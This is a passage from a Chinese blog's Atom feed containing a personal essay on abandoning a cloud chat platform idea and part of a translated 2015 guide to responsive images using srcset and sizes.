      <category term="成人礼" scheme="http://hsfzxjy.github.io/tags/%E6%88%90%E4%BA%BA%E7%A4%BC/"/>
    
      <category term="杂感" scheme="http://hsfzxjy.github.io/tags/%E6%9D%82%E6%84%9F/"/>
    
      <category term="杂感" scheme="http://hsfzxjy.github.io/categories/%E6%9D%82%E6%84%9F/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[炫技？还是需求？]]></title>
    <link href="http://hsfzxjy.github.io//hobby-or-needs/"/>
    <id>http://hsfzxjy.github.io//hobby-or-needs/</id>
    <published>2015-10-03T16:00:00.000Z</published>
    <updated>2015-11-08T08:40:30.149Z</updated>
    <content type="html"><![CDATA[<blockquote>
<p>一款产品，其生命周期始于想法的萌发<br>但其终结，无人能预测<br>诚然，有些产品能够颠覆世界<br>但更多的，只是湮灭在残酷的市场中<br>甚至——<br>有的只是一场白日梦<br>连真正的出生都未曾经历    </p>
</blockquote>
<a id="more"></a>
<h2 id="闪念">闪念</h2><p>“做一个云聊天平台。”</p>
<p>尽管只是一刹那的念头，我却被深深地迷住了。</p>
<p>一直都想拥有一款属于自己的<strong>真正</strong>的产品——所谓<strong>真正</strong>，即从设计，到开发，再到发布和运维都是自己独立完成。毕竟之前外包的社团网站，不过是练手的项目罢了，并不能给我带来足够的成就感。</p>
<p>几个月前，我将博客迁移到了 Github Pages，从而接触到了<strong>多说</strong>。多说 是一个社会化评论插件，通过在网页上插入代码，开发者可以将评论功能集成到自己的网站中。这个插件在国内使用十分广泛，无论是个人博客还是企业网站，随处可见它的身影。事实上，这里边已经有了些许<strong>云</strong>的概念——其本质就是 SaaS（Software as a Service）。</p>
<p>之前在给模联的外包网站中，我曾实现了一个网页版的聊天系统。经过了两个版本的沉淀，其功能已趋于稳定。在开发的过程中，我也积累了许多相关的技术经验——可以说，我已基本了解并掌握了“网页聊天”这个技术栈。</p>
<p>“那么，为什么不将网页聊天做成服务呢？”</p>
<p>受<strong>多说</strong>产品模式的启发，我萌发了一个想法。</p>
<p>“云聊天平台”，项目就此开始。</p>
<h2 id="设计">设计</h2><h3 id="v0-0-1(alpha)_社会化的聊天插件">v0.0.1(alpha) 社会化的聊天插件</h3><p>这是我最初的想法。</p>
<p>在这个版本中，产品的功能被定位为 <strong>交流</strong>。平台提供聊天功能的入口脚本，开发者可以利用其给网页集成聊天功能，用户可以用社交账号自由登陆聊天系统，与同时浏览该网页的其他用户交流看法。</p>
<p>很浓的<strong>多说</strong>的气息，不是吗？灵感出自多说，自然有着多说的影子。</p>
<p>这个想法很快便被否决了，原因如下：</p>
<ul>
<li><strong>交流</strong> 这个功能，现有的评论机制已经基本能满足。无论是用户与用户之间的互动，还是评论的实时更新，都已有了成功的案例。若是将其替换成聊天，并不会有多少功能上的创新，无非是增添了新鲜感罢了。风头一过，很快便会衰落。</li>
<li>从 Web 1.0 时代起就有了 评论 这种机制，在十几年的时间中，用户已形成了固有的使用习惯。用新的使用习惯去冲击传统，个人觉得，成功的可能性不大。</li>
<li>除了”吐槽“，用户也需要”分享“，这和产品的定位相悖。</li>
</ul>
<h3 id="v0-1-0(final)_高度可定制的云聊天平台">v0.1.0(final) 高度可定制的云聊天平台</h3><p>将产品定位仅局限在”交流“，未免太小气了些。要做，就要做大。</p>
<p>在最终的版本里，产品的功能被泛化。平台仅提供”聊天“的基础服务——这是可定制的服务，从用户系统，到界面都是可重写的，甚至还可以利用插件扩展其功能。聊天功能也不仅局限在网页中，开发者可以使用 WebView 实现其对 移动 App 的支持。至于聊天功能的用途，开发者可以自行决定。</p>
<p>有些大企业的味道了，我甚至能想象到自己赚得盆满钵满的样子。（=_=!）</p>
<p>确实，这是一个极好的入手点。一旦产品成型，成功的几率会很大。</p>
<p>接下来，便要进行一些相关的调查。</p>
<h2 id="调查">调查</h2><p>用 Google 查询”云聊天平台“，我发现已经有了同类的产品，而且还有不少。</p>
<p>其中做的不错的，莫过于 <a href="http://www.rongcloud.cn/" target="_blank" rel="external">融云即时通讯云</a>。该产品出现于 2014 年，服务范围覆盖 Android、iOS 以及 Web 平台，功能上支持 单聊、群聊、语音视频聊天，同时也是高度可定制的。同时对于聊天、客服平台等常见的应用场景，也有完善的解决方案。如今已占有了七成以上的即时通讯市场。</p>
<p>此外，还有<a href="http://www.yuntongxun.com/api/im/imFunction#point_box" target="_blank" rel="external">融联云通讯</a>。这是一家实力雄厚的企业，除了提供即时 IM 服务，还有 视频通话、呼叫中心等产品。</p>
<p>至于在网页客服平台领域，相关的产品简直数不胜数。它们大多都有了一定的技术积淀。</p>
<p>……</p>
<p>一番调查下来，结果是令人失望的。如果只是作为个人项目，云聊天平台 成功的可能性微乎其微。和那些大企业相比，我的技术实力无异于以卵击石。</p>
<p>没办法，项目的构想到此为止吧。</p>
<h2 id="反思">反思</h2><p>“颠覆性的产品”，有着宏伟的蓝图，却在动工之前便夭折了。</p>
<p>事后，再回想，那产品真的会是颠覆性的吗？未必。市场上已有了诸多相当成熟的同类产品，一个老旧的 idea，没有亮点的 idea，很难有立足之地。</p>
<p>但在那引以为傲的灵感迸发之初，我却完全不是这么想的。</p>
<p>对所谓“灵感”的痴迷，说到底，还是由于 Websocket 技术。2013 年那会儿，新浪云的 Channel 服务刚刚公测——这是一个基于 Websocket 协议的网页实时推送服务，模联网站的聊天系统全靠它的技术支持。</p>
<p>在当时看来，这项技术简直是神一般的存在。同时，业界也有人在大力宣传这项技术，声称“它会颠覆 Web 世界”。</p>
<p>既然是一项“颠覆世界”的技术，我自然也不肯将其局限在一个外包网站中。它应该属于一款“颠覆性”的产品。直到遇到了 多说，一个“伟大”的想法便产生了。</p>
<p>简而言之，这个“伟大的想法“，源自 <strong>不满足于自己所掌握的技术的应用</strong>——或者说：就是想炫技。</p>
<p>如果这只是一个练手的项目，倒也无可厚非。花上一两个星期将其实现出来，放到云平台上运行，再找几个朋友”体验“一下，好强心很快可以得到满足。至于项目的后续维护，你无需理会——反正，又不用靠它来吃饭。</p>
<p>但这不是一个 demo，是一个互联网产品，是要面向真正的用户的，是要进入市场的。</p>
<p>我知道，我并不是个案。还有许许多多的创业者，他们做一款产品的理由，只是他们想做这款产品——当然了，他们大部分都和我一样，在白日梦阶段便停止了。</p>
<p>产品，最重要的是要贴合用户的需求。真正的产品，都是先经过周密的市场调查分析，得出用户需求取向，再进行下一步的设计。而用来炫技的产品，则恰好反其道而行之：先设计产品，再去迎合市场。</p>
<p>也许你会说：诺基亚当年风生水起时，用户的需求取向肯定不是触屏无键盘智能手机，但乔布斯不是照样发布 iphone 吗？而且，如果没有一些特立独行的人去开发新需求，科技又怎能进步呢？</p>
<p>诚然，这个市场总是需要一些东西去冲击其固有的需求。乔布斯做过，扎克伯格也做过，他们在一定程度上都扭转了市场的走向。但无论是 iphone 还是 facebook，都不是因为决策者灵光一闪而诞生的。很多用户不知道自己想要什么，但产品经理可以通过分析特定领域的市场状况，“猜”出用户将来可能需要什么，并付诸于行动。当然，也有一些“极为创新”的产品，误打误撞获得了成功，但那只是极少数而已。</p>
<p>当然，Google 除外。公众常常能看到 Google 在干一些奇怪的事情，比如用热气球提供 wifi，开发智能眼镜、智能汽车等高端产品。这些项目有九成都是失败的，从而给人带来一种感觉：Google 的决策者们并不懂市场需求。</p>
<p>事实上，Google 无需理会市场需求，它只是在做自己喜欢的事情而已。这些“然并卵”的产品，有许多真的是设计师灵光一闪而成型的，都是些“未来型”的科技产品，本来就没打算在这个时代赢得多少市场。可以说，Google 在尝试给未来的科技发展提供多种可能的方向。即便是失败了，也无妨，反正这只是一个异想天开。</p>
<p>这种超常的自信，源于 Google 雄厚的资本积累。Google 几乎垄断了全世界的搜索引擎市场，每季度仅靠投放广告赚的钱便可以维持运转。而搜索引擎并不需要很短的迭代周期，因此 Google 有充足的时间和金钱来做自己喜欢做的事情。</p>
<h2 id="后记">后记</h2><blockquote>
<p>我有一个很好的 idea，产品做出来肯定会震惊世界的——就只差一个程序员了。<br><cite> ——一个在业界广为流传的笑话 </cite></p>
</blockquote>
<p>能不能震惊世界，并不是由你说了算。你想做的，并不一定是用户想要的。但有一点：<strong>得用户者得天下</strong>。</p>
<p>==<em>谨以此文，警示将来的自己以及众多踌躇满志的创业者</em>==</p>
]]></content>
    <summary type="html">
    <![CDATA[<blockquote>
<p>一款产品，其生命周期始于想法的萌发<br>但其终结，无人能预测<br>诚然，有些产品能够颠覆世界<br>但更多的，只是湮灭在残酷的市场中<br>甚至——<br>有的只是一场白日梦<br>连真正的出生都未曾经历    </p>
</blockquote>]]>
    
    </summary>
    
      <category term="产品" scheme="http://hsfzxjy.github.io/tags/%E4%BA%A7%E5%93%81/"/>
    
      <category term="杂感" scheme="http://hsfzxjy.github.io/tags/%E6%9D%82%E6%84%9F/"/>
    
      <category term="编程" scheme="http://hsfzxjy.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="杂感" scheme="http://hsfzxjy.github.io/categories/%E6%9D%82%E6%84%9F/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[【译】响应式图片的现状]]></title>
    <link href="http://hsfzxjy.github.io//the-state-of-responsive-images-in-2015/"/>
    <id>http://hsfzxjy.github.io//the-state-of-responsive-images-in-2015/</id>
    <published>2015-09-18T16:00:00.000Z</published>
    <updated>2015-11-08T08:40:30.149Z</updated>
    <content type="html"><![CDATA[<blockquote>
<p>原文链接：<a href="http://www.webdesignerdepot.com/2015/08/the-state-of-responsive-images/" target="_blank" rel="external">戳这里</a></p>
</blockquote>
<p><img src="http://netdna.webdesignerdepot.com/uploads/2015/08/featured_images1.jpg" alt=""></p>
<p>Web 是一种可视化的媒体。绚丽的视觉效果，很大程度上离不开图片文件所作出的贡献。虽然（Whilst）其中的许多效果都可以用 CSS 和 内联 SVG 来实现，互联网上的许多站点仍需要图片文件。</p>
<p>从去年的统计来看，每个站点中，图片平均占了一半的页面体积，并且随着时间的推移，图片体积有持续增加的趋势；就 2014 年而言，图片的大小便增长了 <strong>21%</strong>。</p>
<p>与此同时，互联网终端的种类、数量也在增长。从 72 ppi（市场份额正在下降）到 600 ppi，不同设备的分辨率（resolution）有着天壤之别。</p>
<p>创建能在任何设备中都有着高质量的图片，其实再容易不过了——用 1000 ppi 的质量保存图片，然后就可以不用再理他了（译者注：原文是 call it a day）。生成的图片，即使是在分辨率最高的设备上查看也是十分清晰的（crisp）。但是，在图片质量提升的同时，图片文件的大小也会相应地增加。要知道，<strong>页面加载时间</strong>可是影响用户体验的<strong>首要因素</strong>——因此，保证站点能够及时地呈现在用户面前是我们义不容辞（incrumbent）的责任。高质量的图片，即使是在宽带环境下加载也要耗费几十秒，更不用说（let alone）是移动端的设备了——简直就是无法使用。</p>
<p>响应式图片的目的，不是要为设备提供尽可能高质量的图片（这一点，我们很容易做到），而是要为设备提供它所能支持的最高质量的图片，仅此而已（nothing more）。</p>
<p>从这篇指南中，你将了解到响应式图片的工作原理（what works），响应式图片仍然存在的问题和陷阱（pitfall），以及如何将响应式图片运用到网站中。</p>
<a id="more"></a>
<h2 id="我能感受到这欲望，对速度的渴求">我能感受到这欲望，对速度的渴求</h2><p>为什么速度这么重要？难道还有人在用 3G 网络吗（译者注：歪果仁科技发达，早已看不起 3G 网络）？如果你的目标客户都住在曼哈顿市中心，为什么还要为莱索托的乡巴佬担心呢（译者注：南非山区）？ 事实上，“每个人都能用上超快的宽带，用上由那些利欲熏心的公司提供的宽带”——听起来就像个神话。</p>
<p>每个人每天都要耗费至少两个小时在恶劣的（inferior）网络环境中。就我而言，在挤公交上下班时（commuting），我常常会上网以打发无聊的时光——每当这时，稳定的 3G 网络听起来都像是遥不可及的美梦。</p>
<p>今年四月的时候，<a href="http://googlewebmastercentral.blogspot.co.uk/2015/04/rolling-out-mobile-friendly-update.html" target="_blank" rel="external">Google 声称</a>“‘移动设备友好性’将会成为移动站点的排名因素“。甚至，在此之前，<a href="http://googlewebmastercentral.blogspot.co.uk/2011/03/introducing-page-speed-online-with.html" target="_blank" rel="external">加载速度也是一个重要的排名因素</a>——无论是显式地体现在 Google 的统计中，抑或是隐式地成为影响网站跳出率（bounce rate）的一个重要因素。</p>
<p>对于两个相近的站点，1Kb 的冗余数据，都可能将你的 Google 排名从第三降到第四、第五，甚至是第十、第十一——换言之，从第一页降到了第二页——这会给你的收入（revenue）带来不小的冲击。</p>
<h2 id="你真的需要这图片吗？">你真的需要这图片吗？</h2><p>图片优化的最高境界便是：没有图片。你的站点上有五张图片，去掉一张，你便节省了 20%——或许更重要地，你节省了一次 HTTP 请求。如果你将五张图片都去掉了，那你就节省了 100%，以及所有的 HTTP 请求。因此，何乐而不为呢？</p>
<p>然而，我们并不会这么做——毕竟在短期内，图片比文字更有感染力。它们能和用户建立一种”感情通道“，从而使用户被站点的内容所吸引。</p>
<p>要知道，<a href="http://www.nngroup.com/articles/how-little-do-users-read/" target="_blank" rel="external">用户从来不读网页</a>——只有极少数人会深入阅读站点上的内容。图片能让我们在很短的时间（a fraction of time）内了解一个品牌，深深地记住它（reinforce）——这是文字做不到的。</p>
<p>也许，图片的体积会很大，加载起来显得很笨重。然而一旦被浏览器渲染出来，和文字相比，它们能够更有力地抓住用户的眼球，更高效地传达品牌信息。</p>
<p>而响应式图片，就是为了更好地把握住这来之不易的”感情通道“，以防不耐烦的用户点击点击了”后退“按钮。</p>
<h2 id="那么，SVG_又怎么样呢？">那么，SVG 又怎么样呢？</h2><p>SVG（可缩放矢量图像）是 Web 发展史上的一大创举。它引领着潮流（ahead of the curve），至今大多数设计师依旧没有意识到其真正的潜力。</p>
<p>SVG ——正如它的名字所描述——是基于矢量的。这意味着 SVG 图像是由点、角和直线构成的。SVG 同时也是——正如它的名字所描述——是可缩放的，这意味着在 5k iMac 和 Android 智能手机上，它会表现得同样出色——没有质量的损失，也没有体积的差别。</p>
<p>如果你需要一张平面插图（flat illustration），一个图标，一个 logo 以及其他所有能够以 SVG 的形式显示出来的东西，SVG 是不二之选（the way to go）。</p>
<p>Web 上大多数图片都是位图。一般来说，位图的工作原理就是将每个像素点依次描述出来，包括它们的颜色（RGB 的形式，即 红、绿、蓝值），以及透明度（在某些场景下）。如果你有一张尺寸为 100px × 100px 的图片，那么它将有 10000 个像素点。如果每个像素点都用 4 个值来描述，那么这张图将等同于 40000 bits 的数据。听起来很多，不是吗？然而有时，它们的体积会比矢量图还要小。</p>
<p>考虑 1px × 1px 的图片，若使用位图，则需要 4 bits 来记录（红、绿、蓝，以及透明度）。现在考虑用矢量的形式来记录相同尺寸的图片：除了 RGBA 颜色值之外，还需要矩形的左上角坐标、长度和宽度这几个量。</p>
<p>这都是些极端的（crude）情况，但它们是准确的。通常，如果一幅图片的矢量版本——假使有的话——比同样的（equivalent）位图占用的体积还要多，那么位图是唯一合理的选择。</p>
<h2 id="（错误地）使用_Javascript">（错误地）使用 Javascript</h2><p>正如生活中的许多问题（如果你的生活是在网络上的话），响应式图片也可以用 Javascript 来解决。事实上，在过去的许多年中，Javascript 是解决这个问题的唯一途径。通过对 User Agent 进行测试，Javascript 可以知道当前的浏览器类型，然后将指向合适的图片地址的 <code>image</code> 标签输出到页面上。</p>
<p>有些 Web 设计师反对这么做，理由是：<a href="https://gds.blog.gov.uk/2013/10/21/how-many-people-are-missing-out-on-javascript-enhancement/" target="_blank" rel="external">有些人会关闭 Javascript 功能</a>。然而，这种情况已经非常少见了，尤其是在移动设备中。尽管如此，这种方法仍存在着一些问题——比如，这种图片不会被搜索引擎机器人解析出来，而且只有当脚本执行后图片才会被加载出来。</p>
<p>事实上，使用 Javascript 最大问题是：这是一种有悖于 Javascript 主要目的的使用方式。HTML 管理数据，CSS 处理表现形式，而 Javascript 负责功能实现。当我们违背了这些既定规则时，我们就会遇到各种各样的问题，遇到需要”奇技淫巧“（hack）来解决的问题。图片的本质是数据，因此应该交由 HTML 来处理。</p>
<h2 id="浏览器的问题">浏览器的问题</h2><p>从 RWD （响应式网页设计，Responsive Web Design）提出至今，图片都是最大的绊脚石（stumbling block）。然而现在，我们要开始寻找方法来解决这各种各样的问题了。能够被称为”最佳实践“的，都是那些久经沙场的（battle-hardened）、有足够成功案例的技术。专业的（dedicated）开发者已经牺牲了自己的时间去去游说（lobby） W3C，以求获得官方的解决方案。而现在，响应式图片第一次成为了可能。</p>
<p>响应式图片的关键，在于它充分地意识到了 Web 的失败之处。为保证响应式图片不会使浏览器崩溃，设计者们早已考虑得十分周到——即使对于不支持响应式图片的浏览器，代码也不会报错，而是向用户展示一张默认的、非响应式的图片。</p>
<p>在这篇文章中，我们将见到两个官方的响应式图片标签：<code>srcset</code> 以及 <code>picture</code>。</p>
<p>截至目前，Edge、Safari 和 iOS Safari 只支持 <code>srcset</code> 的一部分特性。Firefox、Chrome、Opera、Android 内置浏览器以及下一个版本的 Safari 和 iOS Safari 都将会完整地支持它。（我们会在下文讨论它们的区别）</p>
<p>而 <code>picture</code> 元素，已经被 Firefox、Chrome、Opera 以及 Android 内置浏览器完美支持。Edge、Safari 和 iOS Safari 则完全不支持，并且暂时也没有实现它们的打算。</p>
<p>由于不同厂商解析 W3C 特性的方法不同，即使是在兼容它们的浏览器中，也有一些不一致的地方。例如，当你使用 viewport 的大小来区分不同的设备时，有些浏览器会在 viewport 比小图片大 1px 时便将小图切换为大图，而另外一些则在 viewport 完全符合大图显示条件时才会这么做。</p>
<p>总之，浏览器可以分为两大阵营：想要图片质量尽可能高的 以及 想要图片体积尽可能小的。浏览器厂商都在各自推崇（duking）自己的主张，直到某一方的实现被大众所认可——个人而言我喜欢后者，因为它认为性能对用户体验而言更加关键。</p>
<p>至于现在，Web 设计人员的最佳选择就是：坚持 W3C 标准，而不要对浏览器作额外的猜测。毕竟，浏览器的默认体验（高质量 或是 高性能）是由用户选择的默认浏览器决定的——因此，如果用户意识到这其中的区别，那么用户的偏好就最有可能成为浏览器的偏好（译者注：这里怪怪的）。</p>
<h2 id="响应式图片最佳实践（2015）">响应式图片最佳实践（2015）</h2><p>纵观 Web 的历史，我们曾经用一个标签来表示图片：<code>img</code> 标签。在 HTML5 中，<code>img</code> 的角色经历了（undergone）一些微妙（subtle）的变化——它被设计成响应式图片的开关，即其不再代表一张图片，而只是响应式图片的占位符。</p>
<p>这其中的区别十分重要。曾经，<code>img</code> 标签只能持有一副图片的数据（位图 或 矢量图）——而现在，它能持有多幅图的数据。</p>
<p><code>img</code>标签看起来是这样的（概括（recap）给非开发者）：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">img</span> <span class="attribute">src</span>=<span class="value">""</span> <span class="attribute">alt</span>=<span class="value">""</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>img</code> 标签的响应式版本看起来是这样的：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">img</span> <span class="attribute">srcset</span>=<span class="value">""</span> <span class="attribute">src</span>=<span class="value">""</span> <span class="attribute">alt</span>=<span class="value">""</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<p>仅仅（Barely）只有一些区别而已。仔细看代码，你会注意到一件重要的事情：<strong>代码是向后兼容的</strong>。如果一个浏览器不能理解 <code>srcset</code> 属性，它会简单地忽略它，并按照 1993 年的原始标准进行渲染。</p>
<p>这意味着：我们能通过标记来使用响应式图片，而不需要对相关特性进行检测。</p>
<p>在新的响应式 <code>img</code> 标签中， 原则上 <code>src</code> 属性只是为不支持 <code>srcset</code> 的浏览器指定了默认的图片地址，而 <code>srcset</code> 属性则包含了用于适配各种分辨率的图片信息。</p>
<p>在渲染 <code>img</code> 标签是时，浏览器会自己决定出最适合的图片文件。</p>
<h3 id="使用_srcset">使用 srcset</h3><p>既然我们已经知道 <code>srcset</code> 在不兼容的浏览器中会静默失败，我们便可以子有底增加图片了：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">img</span> <span class="attribute">srcset</span>=<span class="value">"image-b.jpg"</span> <span class="attribute">src</span>=<span class="value">"image-a.jpg"</span> <span class="attribute">alt</span>=<span class="value">"an image"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<p>在这个例子中，任何支持 <code>srcset</code> 的浏览器将会显示 <code>image-b.jpg</code>，而任何不支持的浏览器则会显示 <code>image-a.jpg</code>。</p>
<p>重要的是，你要知道浏览器只会下载它想要显示的图片，而并不会将所有图片都加载出来后再进行选择。</p>
<p>遗憾的是，我们并没有任何进步——除非我们是在展示 <code>srcset</code> 属性的使用，仅靠 <code>srcset</code> 的支持与否来加载图片并没有什么实际的应用。</p>
<p>解决方法就是：为浏览器提供更多的信息，让其知道自己该选择那一张图片。为了做到这一点，我们需要提供和图片的 像素密度（pixel density） 以及 可用空间（available space） 相关的信息。</p>
<h3 id="使用_x_描述符">使用 x 描述符</h3><p>x 描述符能够让浏览器知道图片的像素密度。</p>
<p>举个例子，如果你想要提供一张两倍像素于标准图片的 视网膜级的（retina-grade）的图片，你需要在 <code>srcset</code> 中做出说明：在文件名后加上 <code>2x</code>。</p>
<p>这是我们的图片：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">img</span> <span class="attribute">src</span>=<span class="value">"image.jpg"</span> <span class="attribute">alt</span>=<span class="value">"an image"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<p>为了给浏览器增添一个视网膜选项，我们将作出如下修改：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">img</span> <span class="attribute">srcset</span>=<span class="value">"retina-image.jpg 2x"</span> <span class="attribute">src</span>=<span class="value">"image.jpg"</span> <span class="attribute">alt</span>=<span class="value">"an image"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<p>在这个案例中，有三个可能的结果：</p>
<ol>
<li>如果浏览器不支持 <code>srcset</code>，则 <code>src</code> 所定义的图片将会被使用。</li>
<li>如果浏览器支持 <code>srcset</code> ，并且屏幕能够胜任两倍的分辨率，则 <code>srcset</code> 所定义的图片将会被采用</li>
<li>如果浏览器支持 <code>srcset</code>，但是没有足够高的分辨率，<code>src</code> 所定义的图片将会被采用（在 <code>srcset</code> 没有定义 <code>1x</code> 图片的情况下，<code>src</code> 属性会被视为这种情况下的选项）</li>
</ol>
<p>浏览器支持是良好的，并且在飞快地改进中。只用一个属性，我们就解决了响应式图片的难题（conundrum），真棒！</p>
<p>最后，关于 x 描述符，值得注意的是：图片的选择是基于像素密度的。故如果一个用户将浏览器缩放至 200%（等效于将图片大小减半，将像素密度加倍），2x 图片将会被加载。这会对 无障碍访问设备（accessibility）造成一些不利（detrimental）的影响——我们当然不希望在视力受损者访问网站时加载速度下降，而仅仅是因为他们缩放了网页。</p>
<h3 id="使用_w_描述符">使用 w 描述符</h3><p>w 描述符比 x 描述符稍微先进一些。w 描述符的工作原理是：对于一个特定的图片选项，它会告诉浏览器 x 轴上的实际像素有多少（即宽度）。</p>
<p>截止写作时，Edge，Safari 以及 iOS Safari 尚不支持 w 描述符，这在某些程度上削弱了它的实用性。</p>
<p>让我们回到原来的图片：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">img</span> <span class="attribute">src</span>=<span class="value">"image.jpg"</span> <span class="attribute">alt</span>=<span class="value">"an image"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<p>假设在本地时，这张图片的宽度是 1600 像素，现在我们想要新增一张视网膜级的图片。正如 x 描述符，我们将在 <code>srcset</code> 中定义宽为一张 3200 像素的图片：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">img</span> <span class="attribute">srcset</span>=<span class="value">"retina-image.jpg 3200w"</span> <span class="attribute">src</span>=<span class="value">"image.jpg"</span> <span class="attribute">alt</span>=<span class="value">"an image"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<p>w 描述符最大的毛病（gotcha）就是：尽管在使用 x 描述符时， <code>src</code> 属性被视为默认选项，在支持 <code>srcset</code> 的浏览器上使用 w 描述符时它却会被忽略。在使用 w 描述符时，我们只能显示地定义默认图片：加上第二个 <code>srcset</code> 图片选项，用逗号分隔：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">img</span> <span class="attribute">srcset</span>=<span class="value">"retina-image.jpg 3200w, image.jpg 1600w"</span> <span class="attribute">src</span>=<span class="value">"image.jpg"</span> <span class="attribute">alt</span>=<span class="value">"an image"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<p>导致有代码洁癖的我们要去使用……</p>
<h3 id="使用多幅图片">使用多幅图片</h3><p>能够在 HTML 代码中为浏览器提供高分辨率图片选项，确实很酷——然而，就像你所猜测的那样，当我们指定多幅图片时，事情会变得更酷。</p>
<p>响应式图片的目的，就是为了给不同的设备提供尽可能高质量的图片，而不要存在任何冗余。简单地提供一张高质量的图片还不够，我们需要提供更多的选择——比如 1x、1.5x、2x、2.5x 和 3x 的。</p>
<p>再回过头来，这是我们的原始定义：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">img</span> <span class="attribute">src</span>=<span class="value">"image.jpg"</span> <span class="attribute">alt</span>=<span class="value">"an image"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<p>接下来，我们为浏览器提供了一个视网膜级的选项：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">img</span> <span class="attribute">srcset</span>=<span class="value">"retina-image.jpg 2x"</span> <span class="attribute">src</span>=<span class="value">"image.jpg"</span> <span class="attribute">alt</span>=<span class="value">"an image"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<p>而在这一次，我们会提供更多的额外选项，我们用逗号分隔它们：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">img</span> <span class="attribute">srcset</span>=<span class="value">"huge-image.jpg 3x, retina-image 2x, moderate-image 1.5x"</span> <span class="attribute">src</span>=<span class="value">"image.jpg"</span> <span class="attribute">alt</span>=<span class="value">"an image"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<p>由于对于不同的人而言，关键字有着不同的意思，我建议根据 x 描述符来为图片命名，这样更有助于人脑的记忆，同时也更容易确定各个图片的尺寸以及让团队中的成员更加清楚：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">img</span> <span class="attribute">srcset</span>=<span class="value">"image_3x.jpg 3x, image_2x.jpg 2x, image_1-5.jpg 1.5x"</span> <span class="attribute">src</span>=<span class="value">"image.jpg"</span> <span class="attribute">alt</span>=<span class="value">"an image"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<p>要记住：我们并没有告诉浏览器应该选择哪一幅图片，我们只是将可用的选项告诉了它，并允许它自行选择。浏览器只会下载其中的一副图片。</p>
<p>在使用多幅图片时有一个问题：永远不要为一幅图片定义两种描述符——举个例子：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">img</span> <span class="attribute">srcset</span>=<span class="value">"cross-the-streams.jpg 2x, cross-the-streams.jpg 3200w"</span> <span class="attribute">src</span>=<span class="value">"image.jpg"</span> <span class="attribute">alt</span>=<span class="value">"an image"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<p><a href="https://www.youtube.com/watch?v=jyaLZHiJJnE" target="_blank" rel="external">这会很不好</a>……</p>
<h3 id="使用_sizes">使用 sizes</h3><p>除了定义格式，<code>sizes</code> 属性是相当有趣的，因为 <code>sizes</code> 属性的值是相对于 viewport 而言的，而不是图片本身。</p>
<p>使用 <code>vw</code> （viewport width），我们以相对于浏览器宽度的方式指定了图片区域——记住，<code>img</code> 标签现在只等效于一个占位符，因此我们不是在指定图片的实际尺寸，而是在指定包含图片的占位符的尺寸。</p>
<p><code>100v</code> 就是 100% 的 viewport 宽度， <code>50vw</code> 就是 50% 的 viewport 宽度，<code>25vw</code> 就是 25% 的 viewport 宽度……以此类推。</p>
<p>如果我们想让 <code>img</code> 的宽度达到浏览器宽度的一半，我们可以这样：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">img</span> <span class="attribute">sizes</span>=<span class="value">"50vw"</span> <span class="attribute">srcset</span>=<span class="value">"retina-image.jpg 2x"</span> <span class="attribute">src</span>=<span class="value">"image.jpg"</span> <span class="attribute">alt</span>=<span class="value">"an image"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<p>这并不是特别有用，直到我们将它和 media query 结合起来……</p>
<h3 id="使用_media_query">使用 media query</h3><p>当我们将 <code>sizes</code> 属性和 media query 相结合时，它会变得越来越强大。我们可以用逗号分隔多个 viewport 宽度，并通过 CSS 风格的 media query 告诉浏览器该使用哪一个。</p>
<p>举个例子，想象我们需要这么一张图片：在大多数的设备上它将占用 80% 的浏览器宽度，但在宽度小于等于  380px 的小尺寸设备（手机）上，我们想让它充满所有的空间（100% 的宽度）。我们应该这么写：</p>
